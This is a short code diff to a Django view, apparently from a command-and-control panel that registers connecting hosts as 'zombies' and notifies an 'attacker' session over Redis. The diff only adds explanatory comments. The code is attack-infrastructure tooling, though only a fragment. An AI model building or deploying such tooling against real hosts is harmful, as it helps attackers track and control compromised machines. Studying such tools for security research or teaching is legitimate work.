@@ -26,16 +26,18 @@ class ZombieConnection(View):
     global Zombies
     def get(self,request,**kwargs):
 
-
+        #check if zombie exists
         try:
             zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
         except Zombie.DoesNotExist:
             newZombie = Zombie.objects.create(host=request.META['HTTP_HOST'])
-
+            #tell attacker new zombie added
             redis_publisher = RedisPublisher(facility='attacker',sessions=[Attacker.objects.all()[0].sesskey])
             redis_publisher.publish_message(RedisMessage(simplejson.dumps({'newzombieId':newZombie.pk,'newzombieHost':newZombie.host})))
+        #check if session exits
         if not request.session.exists(request.session.session_key):
             request.session.create()
+        #add zomvie to list
         zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
         zom.sesskey = request.session.session_key
         zom.save()
